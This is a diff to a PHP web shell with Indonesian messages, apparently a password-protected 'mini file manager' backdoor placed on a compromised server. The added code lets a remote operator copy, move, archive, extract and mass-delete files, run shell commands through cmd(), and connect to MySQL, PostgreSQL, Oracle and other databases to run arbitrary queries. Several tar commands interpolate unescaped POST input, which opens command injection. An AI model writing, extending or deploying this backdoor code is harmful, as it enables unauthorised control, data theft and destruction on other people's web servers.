+			if(!@is_writable($target)){
+				echo 'Tujuan ('. $target.') is not writeable!';
+				die();
+			}
+			if($_POST['xtype'] == 'file'){
+				if(file_exists($df)){
+					$outss = @copy($df, $target.'/'.$_POST['xname']) ? $_POST['xname'].' berhasil di copy!' : $_POST['xname'].' gagal di copy!';
+				} else {
+					$outss = $_POST['xname'].' sudah ada!';
+				}
+			} else if($_POST['xtype'] == 'dir'){
+				if(copyDir($df, $target.'/'.$_POST['xname'])){
+					$outss = $_POST['xname'].' berhasil di copy!';
+				} else {
+					$outss = $_POST['xname'].' gagal di copy!';
+				}
+			}
+		} else {
+			$outss = 'permintaan tidak lengkap!';
+		}
+		echo $outss;	
+		die();		
+	} else if($_GET['act'] == 'cut'){
+		if(isset($_POST['xtype'], $_POST['xname'], $_POST['xpath'], $_POST['xtarget'])){
+			$df = rtrim($_POST['xpath'],'/') .'/'. $_POST['xname'];
+			$target = rtrim($_POST['xtarget'], '/');
+			if(!@is_dir($target)){
+				echo 'Tujuan ('. $target.') bukanlah sebuah direktori!';
+				die();
+			}
+			if(!@is_writable($target)){
+				echo 'Tujuan ('. $target.') is not writeable!';
+				die();
+			}
+			if($_POST['xtype'] == 'file'){
+				if(file_exists($df)){
+					$outss = @rename($df, $target.'/'.$_POST['xname']) ? $_POST['xname'].' berhasil di pindahkan!' : $_POST['xname'].' gagal di pindahkan!';
+				} else {
+					$outss = $_POST['xname'].' sudah ada!';
+				}
+			} else if($_POST['xtype'] == 'dir'){
+				if(is_dir($df)){
+					$outss = @rename($df, $target.'/'.$_POST['xname']) ? $_POST['xname'].' berhasil di pindahkan!' : $_POST['xname'].' gagal di pindahkan!';
+				} else {
+					$outss = $df.' tidak ditemukan!';					
+				}
+			}
+		} else {
+			$outss = 'permintaan tidak lengkap!';
+		}
+		echo $outss;
+		die();
 	} else if($_GET['act'] == 'del'){
 		if(isset($_POST['xtype'], $_POST['xname'], $_POST['xpath'])){
 			$df = $_POST['xpath'] .'/'. $_POST['xname'];
-			if(@is_dir($df)){
-				xrmdir($df);
+			if($_POST['xtype'] == 'dir' && @is_dir($df)){
+				if(file_exists($df)){
+					xrmdir($df);					
+				}
 				$outss = file_exists($df) ? "Hapus dir gagal!" : "Hapus dir sukses!";
-			} else if(@is_file($df)){
-				@unlink($df);
+			} else if($_POST['xtype'] == 'file' && @is_file($df)){
+				if(file_exists($df)){
+					@unlink($df);					
+				}
 				$outss = file_exists($df) ? "Hapus file gagal!" : "Hapus file sukses!";
 			}
 			echo $outss;
 			die();
 		}
+	} else if($_GET['act'] == 'tar'){
+		$df = $_POST['xpath'] .'/'. $_POST['xname'];
+		$fnm = explode('.', $_POST['xname']);
+		$newname = count($fnm)>0 ? current($fnm).'.tar' : $_POST['xname'].'.tar';
+		if(file_exists($newname)){
+			unlink($_POST['xpath'].'/'.$newname);
+		}
+		cmd("tar cf {$newname} {$_POST['xname']}", $_POST['xpath']);
+		$outs = file_exists($_POST['xpath']."/".$newname) ? "archived success" : "archived failed";
+		echo $outs;
+		die();
+	} else if($_GET['act'] == 'tgz'){
+		$df = $_POST['xpath'] .'/'. $_POST['xname'];
+		$fnm = explode('.', $_POST['xname']);
+		$newname = count($fnm)>0 ? current($fnm).'.tar.gz' : $_POST['xname'].'.tar.gz';
+		if(file_exists($newname)){
+			unlink($_POST['xpath'].'/'.$newname);
+		}
+		cmd("tar czf {$newname} {$_POST['xname']}", $_POST['xpath']);
+		$outs = file_exists($_POST['xpath']."/".$newname) ? "archived success" : "archived failed";
+		echo $outs;
+		die();
 	} else if($_GET['act'] == 'zip'){
 		if(class_exists('ZipArchive')){
 			$zip = new ZipArchive();
@@ -746,20 +1144,395 @@ if(isset($_GET['act'])){
 		}
 		echo $outss;
 		die();
-	} else if($_GET['act'] == 'getpma'){
-		$fnames = 'miniFmAdminer.php';
-		if(isset($_GET['del'])){
-			@unlink($lokasiberkas."/".$fnames);
-			$outs = file_exists($lokasiberkas."/".$fnames) ? array('error' => 1, 'message' => 'Hapus file gagal!') : array('error' => 0, 'message' => 'Hapus file sukses!!');
+	} else if($_GET['act'] == 'untar'){
+		$df = $_POST['xpath'] .'/'. $_POST['xname'];
+		cmd("tar xf {$_POST['xname']} -C {$_POST['xpath']}", $_POST['xpath']);
+		try {
+			$phar = new PharData($_POST['xname']);
+			foreach ($phar as $file) {
+				$targetPath = $_POST['xpath'] . $file->getFilename();
+				if (file_exists($targetPath)) {
+					echo "File {$file->getFilename()} sudah ada, melewati...\n";
+					continue;
+				}
+				$phar->extractTo($_POST['xpath'], [$file->getFilename()], true);
+				echo "File {$file->getFilename()} berhasil diekstrak.\n";
+			}
+		} catch (Exception $e) {
+			echo "Error: " . $e->getMessage();
+		}
+		die();
+	} else if($_GET['act'] == 'untgz'){
+		$df = $_POST['xpath'] .'/'. $_POST['xname'];
+		cmd("tar xzf {$_POST['xname']} -C {$_POST['xpath']}", $_POST['xpath']);
+		try {
+			$phar = new PharData($_POST['xname']);
+			foreach ($phar as $file) {
+				$targetPath = $_POST['xpath'] . $file->getFilename();
+				if (file_exists($targetPath)) {
+					echo "File {$file->getFilename()} sudah ada, melewati...\n";
+					continue;
+				}
+				$phar->extractTo($_POST['xpath'], [$file->getFilename()], true);
+				echo "File {$file->getFilename()} berhasil diekstrak.\n";
+			}
+		} catch (Exception $e) {
+			echo "Error: " . $e->getMessage();
+		}
+		die();
+	} else if($_GET['act'] == 'unzip'){
+		if(class_exists('ZipArchive')){
+			$zip = new ZipArchive();
+			$df = $_POST['xpath'] .'/'. $_POST['xname'];
+			if($zip->open($df)) {
+				$zip->extractTo($_POST['xpath']);
+				$outss = $_POST['xname'].' extracted!';
+				$zip->close();
+			} else {
+				$outss = $_POST['xname'].' gagal di unzip!';
+			}
 		} else {
-			$outs = array('error' => 1, 'message' => 'This directory not writeable!');
-			if(is_writable($lokasiberkas)){
-				transferFile('https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php', $lokasiberkas, $fnames);
-				$outs = file_exists($lokasiberkas."/".$fnames) ? array('error' => 0, 'message' => $weburl."/".$fnames) : array('error' => 1, 'message' => 'gagal!');
+			$outss = 'module ZipArchive tidak terinstall!';
+		}
+		echo $outss;
+		die();
+	} else if($_GET['act'] == 'mass_zip'){
+		if(class_exists('ZipArchive')){
+			$zip = new ZipArchive();
+			$zipfile = (isset($_POST['xname']) && !empty(trim($_POST['xname'])) ? trim($_POST['xname']) : 'zip_'.date('U')).'.zip';
+			if($zip->open($zipfile, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE){
+				$outss = "Tidak dapat membuat file ZIP: {$zipfile}";
+			}
+			$hasils = false;
+			$xdata = json_decode(base64_decode($_POST['xdata']),true);
+			foreach ($xdata as $ki => $item) {
+				$itemPath = $item['name'];
+				if($item['type'] == 'dir'){
+					addDirToZip($zip, $itemPath, $_POST['xpath']);					
+					$hasils = true;
+				} else if ($item['type'] == 'file') {
+					$zip->addFile($itemPath, $item['name']);
+					$hasils = true;
+				}
+			}
+			$outss = $hasils == true ? 'ZIP file berhasil dibuat: '.$zipfile : 'Item tidak valid atau tidak ditemukan!';
+			$zip->close();
+		} else {
+			$outss = 'module ZipArchive tidak terinstall!';
+		}
+		echo $outss;
+		die();
+	} else if($_GET['act'] == 'mass_tar'){
+		$path = rtrim($_POST['xpath'], '/');
+		$tarfile = (isset($_POST['xname']) && !empty(trim($_POST['xname'])) ? trim($_POST['xname']) : 'tar_'.date('U')).'.tar';
+		$Command = "tar cf {$tarfile}";
+		$xdata = json_decode(base64_decode($_POST['xdata']),true);
+		foreach ($xdata as $ki => $item){
+			$itemPath = $path . '/' . $item['name'];
+			if (file_exists($itemPath)) {
+				$Command .= ' '.escapeshellarg($item['name']);
 			}
 		}
-		header("Content-type: application/json; charset=utf-8");
-		echo json_encode($outs);
+		cmd($Command, $path);
+		echo file_exists($path.'/'.$tarfile) ? "File TAR berhasil dibuat: {$tarfile}" : "Item tidak valid atau tidak ditemukan";
+		die();
+	} else if($_GET['act'] == 'mass_tgz'){
+		$path = rtrim($_POST['xpath'], '/');
+		$tgzfile = (isset($_POST['xname']) && !empty(trim($_POST['xname'])) ? trim($_POST['xname']) : 'tgz_'.date('U')).'.tar.gz';
+		$Command = "tar czf {$tgzfile}";
+		$xdata = json_decode(base64_decode($_POST['xdata']),true);
+		foreach ($xdata as $ki => $item){
+			$itemPath = $path . '/' . $item['name'];
+			if (file_exists($itemPath)) {
+				$Command .= ' '.escapeshellarg($item['name']);
+			}
+		}
+		cmd($Command, $path);
+		echo file_exists($path.'/'.$tgzfile) ? "File TAR.GZ berhasil dibuat: {$tgzfile}" : "Item tidak valid atau tidak ditemukan";
+		die();
+	} else if($_GET['act'] == 'mass_copy'){
+		$path = rtrim($_POST['xpath'], '/');
+		$target = rtrim($_POST['xtarget'], '/');
+		$xdata = json_decode(base64_decode($_POST['xdata']),true);
+		if(!@is_dir($target)){
+			echo 'Tujuan ('.$target.') bukanlah sebuah direktori!';
+			die();
+		}
+		if(!@is_writable($target)){
+			echo 'Tujuan ('.$target.') is not writeable!';
+			die();
+		}
+		$hasils[] = '';
+		foreach($xdata as $ki => $item){
+			$sourcePath = $path.'/'.$item['name'];
+			$targetPath = $target.'/'.$item['name'];
+			if($item['type'] === 'file'){
+				if(file_exists($sourcePath)){
+					if(@copy($sourcePath, $targetPath)){
+						$hasils[] = 'Copy file berhasil!';
+					} else {
+						$hasils[] = 'Copy file gagal!';
+					}
+				} else {
+					$hasils[] = 'Copy file gagal!';
+				}
+			} else if($item['type'] === 'dir'){
+				if(copyDir($sourcePath, $targetPath)){
+					$hasils[] = 'Copy dir berhasil!';
+				} else {
+					$hasils[] = 'Copy dir gagal!';
+				}
+			}
+		}
+		$outs = implode(', ', array_unique($hasils));
+		echo $outs;
+		die();
+	} else if($_GET['act'] == 'mass_cut'){
+		$path = rtrim($_POST['xpath'], '/');
+		$target = rtrim($_POST['xtarget'], '/');
+		$xdata = json_decode(base64_decode($_POST['xdata']),true);
+		if(!@is_dir($target)){
+			echo 'Tujuan ('.$target.') bukanlah sebuah direktori!';
+			die();
+		}
+		if(!@is_writable($target)){
+			echo 'Tujuan ('.$target.') is not writeable!';
+			die();
+		}
+		$hasils[] = '';
+		foreach($xdata as $ki => $item){
+			$sourcePath = $path.'/'.$item['name'];
+			$targetPath = $target.'/'.$item['name'];
+			if($item['type'] === 'file'){
+				if(file_exists($sourcePath)){
+					$isCopyF = @copy($sourcePath, $targetPath);
+					if($isCopyF){
+						@unlink($sourcePath);
+						$hasils[] = "Cut file berhasil!";
+					} else {
+						$hasils[] = "Cut file gagal!";
+					}
+				}
+			} else if($item['type'] === 'dir'){
+				$isCopyD = copyDir($sourcePath, $targetPath);
+				if($isCopyD){
+					xrmdir($sourcePath);
+					$hasils[] = "Cut dir berhasil!";
+				} else {
+					$hasils[] = "Cut dir gagal!";
+				}
+			}
+		}
+		$outs = implode(', ', array_unique($hasils));
+		echo $outs;
+		die();
+	} else if($_GET['act'] == 'mass_del'){
+		$path = rtrim($_POST['xpath'], '/');
+		$xdata = json_decode(base64_decode($_POST['xdata']),true);
+		$hasils = false;
+		foreach ($xdata as $ki => $item){
+			if($item['type'] == 'dir'){
+				xrmdir($path.'/'.$item['name']);
+				$hasils = true;
+			} else {
+				unlink($path.'/'.$item['name']);
+				$hasils = true;
+			}
+		}
+		echo $hasils == true ? 'File deteled!' : 'Gagal menghapus file';
+		die();
+	} else if($_GET['act'] == 'sql'){
+		if($_GET['q'] == 'check'){
+			if(AvFunc(array('mysql_get_client_info', 'mysqli_get_client_info'))){$temp[] = "MySQL";}
+			if(AvFunc(array('mssql_connect'))){$temp[] = "MSSQL";}
+			if(AvFunc(array('pg_connect'))){$temp[] = "PostgreSQL";}
+			if(AvFunc(array('oci_connect'))){$temp[] = "Oracle";}
+			if(AvFunc(array('odbc_connect'))){$temp[] = "odbc";}
+			if(AvFunc(array('sqlite_open'))){$temp[] = "SQLite";}
+			if(class_exists('SQLite3')){$temp[] = "SQLite3";}
+			if(class_exists('PDO')){$temp[] = "PDO";}
+			if(isset($temp) && count($temp) > 0){
+				foreach($temp as $kt){
+					$dtx[] = $kt;
+				}
+			}
+			$outs = isset($dtx) ? array('error' => 0, 'data' => $dtx) : array('error' => 1, 'message' => 'No database installed in this server');
+			header("Content-type: application/json; charset=utf-8");
+			echo json_encode($outs);
+			die();
+		} else if($_GET['q'] == 'connect'){
+			if(isset($_POST)){
+				$sqltype = $_POST['sqltype'];
+				$sqlhost = $_POST['sqlhost'];
+				$sqluser = $_POST['sqluser'];
+				$sqlpass = isset($_POST['sqlpass']) && !empty($_POST['sqlpass']) ? $_POST['sqlpass'] : null;
+				$sqldata = isset($_POST['sqldata']) && !empty($_POST['sqldata']) ? $_POST['sqldata'] : null;
+				switch($sqltype){
+					case 'MySQL'	: $contype = 'mysql'; $showdb = "SHOW DATABASES"; break;
+					case 'PostgreSQL': $contype = 'pgsql'; $showdb = "SELECT schema_name FROM information_schema.schemata"; break;
+					case 'SQLite3'	: 
+					case 'SQLite'	: $contype = 'sqlite'; $showdb = "SELECT \"{$s_sql['host']}\""; break;
+					case 'MSSql'	: $contype = 'mssql'; $showdb = "SELECT name FROM master..sysdatabases"; break;
+					case 'Oracle'	: $contype = 'oracle'; $showdb = "SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME"; break;
+					case 'PDO'		: $contype = 'pdo'; $showdb = "SHOW DATABASES"; break;
+					case 'odbc'		: $contype = 'odbc'; $showdb = "SHOW DATABASES"; break;
+					default			: $contype = 'mysql'; $showdb = "SHOW DATABASES"; 
+				}
+				try {
+					$db = new DatabaseManager($contype, $sqlhost, $sqluser, $sqlpass, $sqldata);
+					$result = $db->query($showdb);
+					while ($row = $db->fetchRow($result)){
+						$dblists[] = "<option value='{$row['Database']}' data-connect='".base64_encode(json_encode(array($contype, $sqlhost, $sqluser, (!empty($sqlpass)?$sqlpass:null), $row['Database'])))."'>{$row['Database']}</option>";
+					}
+					$dtTable = "<hr class='mt-n1' style='background-color:var(--cyan);'/><div class='row mb-3' id='sqlmanager'>
+						<div class='col-sm-3 col-md-3 col-lg-3'>
+							<div class='form-group mb-3'>
+								<label for='dblists' class='mb-1'>Database:</label>
+								<select class='custom-select custom-select-sm border-success' id='dblists'>".(isset($dblists) ? implode('',$dblists) : '')."</select>
+							</div>
+							<div class='table-responsive text-nowrap mb-3' id='dbshowtable'>
+								<table class='table table-sm fixed_listdbtable w-100 mb-0'>
+									<thead class='bg-dark text-light'>
+										<tr><th class='pl-2'>Tables</th></tr>
+									</thead>
+									<tbody id='listdbtables'></tbody>
+								</table>							
+							</div>
+						</div>
+						<div class='col-sm-9 col-md-9 col-lg-9'>
+							<div class='sqltabpanel'>
+								<form method='post' action='?act=sql&q=manage'>
+									<input type='hidden' name='sqlconnect' value='' />
+									<input type='hidden' name='sqlgetdata' value='' />
+									<div class='form-group mb-3'>
+										<label for='sqlquery' class='mb-1'>SQL Query:</label>
+										<div class='input-group'>
+											<textarea name='sqlquery' id='sqlquery' class='form-control form-control-sm border-success' rows='1'></textarea>
+											<div class='input-group-append'><button class='btn btn-sm btn-outline-success' type='submit'>Go</button></div>
+										</div>
+									</div>
+									<div class='input-group input-group-sm mb-3 d-none' id='flimit'>
+										<div class='input-group-prepend'><span class='input-group-text'>Limit</span></div>
+										<input type='text' name='slimit' class='form-control form-control-sm border-success' value='0' onkeyup='this.value = this.value.replace(/[^0-9]/g, \"\");' />
+										<div class='input-group-prepend'><span class='input-group-text'>rows</span></div>
+										<select name='elimit' class='custom-select custom-select-sm border-success'>
+											<option value='25'>25</option>
+											<option value='50'>50</option>
+											<option value='75'>75</option>
+											<option value='100'>100</option>
+											<option value='150'>150</option>
+											<option value='200'>200</option>
+										</select>
+										<div class='input-group-append'><button class='btn btn-sm btn-outline-success' type='submit'>Go</button></div>
+									</div>
+								</form>
+							</div>
+							<div class='mb-3' id='dbshowrows'></div>
+						</div>
+					</div>";
+					echo $dtTable;
+				} catch (Exception $e) {
+					echo $e->getMessage();
+				}
+				$db->close();
+			}
+		} else {
+			if(isset($_POST)){
+				$sqlconnect = json_decode(base64_decode($_POST['sqlconnect']),true);
+				$sqlgetdata = isset($_POST['sqlgetdata']) && !empty($_POST['sqlgetdata']) ? $_POST['sqlgetdata'] : '';
+				$sqlquery = isset($_POST['sqlquery']) && !empty($_POST['sqlquery']) ? $_POST['sqlquery'] : '';
+				$slimit = isset($_POST['slimit']) && !empty(preg_replace('/[^0-9]/','',$_POST['slimit'])) ? preg_replace('/[^0-9]/','',$_POST['slimit']) : 0;
+				$elimit = isset($_POST['elimit']) && !empty(preg_replace('/[^0-9]/','',$_POST['elimit'])) ? preg_replace('/[^0-9]/','',$_POST['elimit']) : 25;
+				switch($sqlconnect[0]){
+					case 'MySQL'	: $contype = 'mysql'; break;
+					case 'PostgreSQL': $contype = 'pgsql'; break;
+					case 'SQLite'	: case 'SQLite3' : $contype = 'sqlite'; break;
+					case 'MSSql'	: $contype = 'mssql'; break;
+					case 'Oracle'	: $contype = 'oracle'; break;
+					case 'PDO'		: $contype = 'pdo'; break;
+					case 'odbc'		: $contype = 'odbc'; break;
+					default			: $contype = 'mysql';
+				}
+				$hasils = [];
+				$db = new DatabaseManager($contype, $sqlconnect[1], $sqlconnect[2], ($sqlconnect[3]!=null?$sqlconnect[3]:''), $sqlconnect[4]);
+				try {
+					if(trim($sqlquery) || trim($sqlgetdata)){
+						if(trim($sqlgetdata) != '' && (trim($sqlquery) == '' || trim($sqlquery) != '')){
+							switch($contype){
+								case 'mysql'	: $showrows = "SELECT * FROM `{$sqlgetdata}` LIMIT {$slimit},{$elimit};"; break;
+								case 'pgsql'	: $showrows = "SELECT * FROM {$sqlgetdata} LIMIT {$elimit} OFFSET {$slimit};"; break; 
+								case 'sqlite'	: $showrows = "SELECT * FROM {$sqlgetdata} LIMIT {$slimit},{$elimit};";  break;
+								case 'mssql'	: $showrows = "SELECT TOP {$elimit} * FROM {$sqlgetdata};";  break;
+								case 'oracle'	: $showrows = "SELECT * FROM {$sqlgetdata} WHERE ROWNUM BETWEEN {$slimit} AND {$elimit};";  break;
+								case 'pdo'		: 
+									$pdoDriver = $db->getConnection()->getAttribute(PDO::ATTR_DRIVER_NAME);
+									switch ($pdoDriver) {
+										case 'mysql'	: $showrows = "SELECT * FROM `{$sqlgetdata}` LIMIT {$slimit},{$elimit};"; break;
+										case 'pgsql'	: $showrows = "SELECT * FROM {$sqlgetdata} LIMIT {$elimit} OFFSET {$slimit};"; break;
+										case 'sqlite'	: $showrows = "SELECT * FROM {$sqlgetdata} LIMIT {$slimit},{$elimit};"; break;
+										case 'sqlsrv'	: $showrows = "SELECT TOP {$elimit} * FROM {$sqlgetdata};"; break;
+										case 'oci'		: $showrows = "SELECT * FROM {$sqlgetdata} WHERE ROWNUM BETWEEN {$slimit} AND {$elimit};"; break;
+										default			: throw new Exception("Unsupported PDO driver: {$pdoDriver}");
+									}
+								break;
+								case 'odbc'	: $showrows = "SELECT * FROM `{$sqlgetdata}` LIMIT {$slimit},{$elimit};";  break;
+								default		: $showrows = "SELECT * FROM `{$sqlgetdata}` LIMIT {$slimit},{$elimit};";
+							}
+						} else if(trim($sqlquery) != '' && (trim($sqlgetdata) == '' || trim($sqlgetdata) != '')){
+							$showrows = $sqlquery;
+						}
+						$resrows = $db->query($showrows);
+						if($resrows){
+							if(!is_bool($resrows)){
+								if($db->numRows($resrows) > 0){
+									while ($row = $db->fetchRow($resrows)){
+										$hasils[] = $row;
+									}
+								} else {
+									$fieldInfo = $db->getFieldInfo($resrows);
+									$hasils[] = array_fill_keys($fieldInfo['field_names'], '-');;
+								}
+							} else {								
+								$hasils[] = ["query" => "Affected Rows: " . $db->affectedRows($showrows)];
+							}
+						}
+					} else {
+						switch($contype){
+							case 'mysql'	: $showtbl = "SHOW TABLES FROM `{$sqlconnect[4]}`"; break;
+							case 'pgsql'	: $showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='{$sqlconnect[4]}'"; break;
+							case 'sqlite'	: $showtbl = "SELECT name FROM sqlite_master WHERE type='table'"; break;
+							case 'mssql'	: $showtbl = "SELECT name FROM {$sqlconnect[4]}.sysobjects WHERE xtype = 'U'"; break;
+							case 'oracle'	: $showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='{$sqlconnect[4]}'"; break;
+							case 'pdo'		: 
+								$driver = $db->getConnection()->getAttribute(PDO::ATTR_DRIVER_NAME);
+								switch ($driver) {
+									case 'mysql'	: $showtbl = "SHOW TABLES FROM `{$sqlconnect[4]}`"; break;
+									case 'pgsql'	: $showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema = '{$sqlconnect[4]}'"; break;
+									case 'sqlite'	: $showtbl = "SELECT name FROM sqlite_master WHERE type='table'"; break;
+									case 'sqlsrv'	: $showtbl = "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES"; break;
+									case 'oci'		: $showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES"; break;
+									default			: throw new Exception("Unsupported PDO driver: {$driver}");
+								}
+							break;
+							case 'odbc'		: $showtbl = "SHOW TABLES"; break;
+							default			: $showtbl = "SHOW TABLES FROM `{$sqlconnect[4]}`";
+						}
+						$result = $db->query($showtbl);
+						if($result && $result->num_rows > 0){
+							while ($row = $db->fetchRow($result)){
+								foreach($row as $s_tables){
+									$hasils[$s_tables][] = $s_tables;
+								}
+							}
+						}
+					}					
+					echo json_encode($hasils);
+				} catch (Exception $e) {
+					echo $e->getMessage();
+				}
+				$db->close();
+			}
+		}
 		die();
 	} else if($_GET['act'] == 'bc'){
 		$outs = '';
@@ -838,22 +1611,6 @@ if(isset($_GET['act'])){
 		}
 		echo $outs;
 		die();
-	} else if($_GET['act'] == 'unzip'){
-		if(class_exists('ZipArchive')){
-			$zip = new ZipArchive();
-			$df = $_POST['xpath'] .'/'. $_POST['xname'];
-			if($zip->open($df)) {
-				$zip->extractTo($_POST['xpath']);
-				$outss = $_POST['xname'].' extracted!';
-				$zip->close();
-			} else {
-				$outss = $_POST['xname'].' gagal di unzip!';
-			}
-		} else {
-			$outss = 'module ZipArchive tidak terinstall!';
-		}
-		echo $outss;
-		die();
 	} else if($_GET['act'] == 'path'){
 		$_SESSION['path'] = isset($_GET['dir']) && !empty($_GET['dir']) ? $_GET['dir'] : $_SESSION['path'];
 		if(isset($_GET['opt'], $_GET['entry'])){
@@ -900,11 +1657,12 @@ if(isset($_GET['act'])){
 					if(!is_writable($df)){
 						$dout = "Disini gk bisa edit file/direktori!";
 					} else {
-						$dout = "";
 						if(AvFunc(array('fopen','fread','fclose'))){
+							$filesize = @filesize($df);
 							$fp = @fopen($df, 'r');
 							if($fp){
-								while(!@feof($fp)){$dout .= htmlspecialchars(@fread($fp, @filesize($df)));}
+								$dout = "";
+								while(!@feof($fp)){$dout .= htmlspecialchars(@fread($fp, $filesize>0?$filesize:8192));}
 								@fclose($fp);
 							}
 						} else{
@@ -987,7 +1745,17 @@ if(!isset($_SESSION['auth'])){
 		<link rel='preconnect' href='https://fonts.googleapis.com'/>
 		<link rel='preconnect' href='https://fonts.gstatic.com' crossorigin/>
 		<link href='https://fonts.googleapis.com/css2?family=Ubuntu+Mono:ital,wght@0,400;0,700;1,400;1,700&display=swap' rel='stylesheet'/>
-		<style>body,html{background-color:#2b2f34}body{margin:0 auto;position:relative;color:#cecece;font-family:\"Ubuntu Mono\",monospace;font-size:1em;background-image:url('https://cdn.svgator.com/images/2022/06/use-svg-as-background-image-particle-strokes.svg');background-position:bottom center;background-repeat:no-repeat;background-size:cover;object-fit:cover}fieldset{background-color:#343a40;border-radius:.3em;border:.5px solid #1e7400;padding-bottom:17.5px}fieldset>div{position:absolute;bottom:0;top:35;left:78%;transform:translate(-50%,50%)}input[type=password],input[type=submit],legend{background-color:#1e7400;padding:5px 10px;border-radius:.3em;box-sizing:border-box;transition:.5s}input[type=password]:focus,input[type=submit],legend{border:1px solid #32c200}input[type=submit]{margin:5px;border:0;color:#cecece}input[type=password]{background-color:#2b2f34!important;color:#cecece;margin:5px;border:.5px solid #1e7400;outline:0}.pfom{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}</style>
+		<style>
+		html,body{background-color:#2b2f34;}
+		body{margin:0 auto; position:relative; color:#cecece; font-family:\"Ubuntu Mono\", monospace; font-size:1em; background-image:url('https://cdn.svgator.com/images/2022/06/use-svg-as-background-image-particle-strokes.svg'); background-position:bottom center; background-repeat:no-repeat; background-size:cover; object-fit:cover;}
+		fieldset{background-color:#343a40; border-radius:.3em; border:.5px solid #1e7400; padding-bottom:17.5px;}
+		fieldset>div{position:absolute; bottom:0; top:35; left:78%; transform:translate(-50%,50%);}
+		legend,input[type='submit'],input[type='password']{background-color:#1e7400; padding:5px 10px; border-radius:.3em;box-sizing:border-box; transition: 0.5s;}
+		legend,input[type='submit'],input[type='password']:focus{border:1px solid #32c200;}
+		input[type='submit']{margin:5px; border:0; color:#cecece;}
+		input[type='password']{background-color:#2b2f34!important; color:#cecece; margin:5px; border:.5px solid #1e7400; outline:none;}
+		.pfom{position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);}
+		</style>
 		</head>
 		<body>
 			<div class='pfom'>
@@ -1012,9 +1780,9 @@ if(!isset($_SESSION['auth'])){
 		<meta charset="utf-8"/>
 		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
 		<link rel="shortcut icon" href="<?php echo fType('logo');?>"/>
-		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/css/bootstrap.min.css" integrity="sha512-rt/SrQ4UNIaGfDyEXZtNcyWvQeOq0QLygHluFQcSjaGB04IxWhal71tKuzP6K8eYXYB6vJV4pHkXcmFGGQ1/0w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha256-+IZRbz1B6ee9mUx/ejmonK+ulIP5A5bLDd6v6NHqXnI=" crossorigin="anonymous">
 		<title><?php echo $stitle;?></title>
-		<style>@import url(https://fonts.googleapis.com/css2?family=Ubuntu+Mono:ital,wght@0,400;0,700;1,400;1,700&display=swap);body,html,pre{transition:font-size .3s ease-in}table tfoot th,table thead th{background:rgb(var(--bs-success-rgb),20%)}:root{--cyan:#2be2ff;--bg-icon:#149232;--bg-success:#00d433;--bs-success-rgb:0,212,51;--bs-danger-rgb:220,53,69}::-webkit-scrollbar-track{border-radius:6px;background-color:#2b2f34}::-webkit-scrollbar{width:6px;height:4px}::-webkit-scrollbar-thumb{border-radius:6px;-webkit-box-shadow:inset 0 0 4px #000;background-color:var(--bg-icon)}body,html,pre{font-family:"Ubuntu Mono",monospace}.modal .modal-body,body,html{background:#2b2f34}body button{color:#eee}body{font-size:1em;padding-top:4rem;color:#ddd}.row{margin-left:-10px;margin-right:-10px}.col,[class*=col-]{padding-right:10px;padding-left:10px}input,select,textarea{font-size:1em!important;transition:.3s ease-in;outline:0}input:focus,select:focus,textarea:focus{box-shadow:none!important}nav .nav-tabs{border-bottom:1px solid #00a6c0}nav .nav-tabs .nav-link.active{background:#00a6c0;color:#fff}nav .nav-tabs .nav-link.active svg path{fill:#ffffff!important}nav .nav-tabs .nav-link.active,nav .nav-tabs .nav-link:focus,nav .nav-tabs .nav-link:hover{border:1px solid #2be2ff}table{border-radius:10px}table td,table th{border-top:1px solid #444c54!important}table tr:nth-child(odd){background:rgb(0,0,0,3%)}table thead th{border-top:0 solid #eee!important;border-bottom:2px solid var(--bg-success)!important}table tfoot th{padding:5px 10px!important;border-top:2px solid var(--bg-success)!important;border-bottom:0 solid #eee!important}table tbody tr td:first-child{padding-left:0}table tbody tr td:last-child{padding-right:0}table thead tr th:first-child{border-top-left-radius:.25rem}table thead tr th:last-child{border-top-right-radius:.25rem}table tfoot tr th:first-child{border-bottom-left-radius:.25rem}table tfoot tr th:last-child{border-bottom-right-radius:.25rem}.breadcrumb-item a,table tbody{color:#cfdce8}table tbody tr:hover td{color:#fff;transition:background .3s ease-in}table tbody tr:hover{background:rgb(var(--bs-success-rgb),10%)}.table-responsive{border-radius:.5em}.breadcrumb{background:linear-gradient(170deg,rgb(var(--bs-success-rgb),20%),transparent);padding:4px 10px}.breadcrumb-item a:hover{color:var(--bg-success)}.breadcrumb-item+.breadcrumb-item{padding-left:.2rem}.breadcrumb-item+.breadcrumb-item::before{padding-right:.2rem}pre,textarea.form-control{font-size:1em;border:0!important;color:#cfdce8!important;transition:font-size .3s ease-in;height:auto;max-height:500px}.form-control-sm{height:auto}.form-control:disabled,.form-control[readonly]{background:#272c31;color:#767676}.media.dir svg{margin:auto;padding-right:.5em}.media.file svg{margin:auto;padding:0 .75em 0 0}.fsmall{display:block;font-size:1.75vh;color:#61aa64}.bg-success-rgb,.input-group-prepend *{background:rgb(var(--bs-success-rgb),10%);border:1px solid rgb(var(--bs-success-rgb),50%);color:rgb(var(--bs-success-rgb),90%)}#hasilcommand *,input[type=text],input[type=text]:active,input[type=text]:focus{background:#343a40;color:#cfdce8}select{background-color:#343a40!important;color:#cfdce8!important}.custom-select{padding:5px 10px;color:#cfdce8;background:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='4' height='5' viewBox='0 0 4 5'%3e%3cpath fill='%23149232' d='M2 0L0 2h4zm0 5L0 3h4z'/%3e%3c/svg%3e") right .75rem center/8px 10px no-repeat #343a40}.custom-file *{background:#343a40;color:#cfdce8;border:1px solid 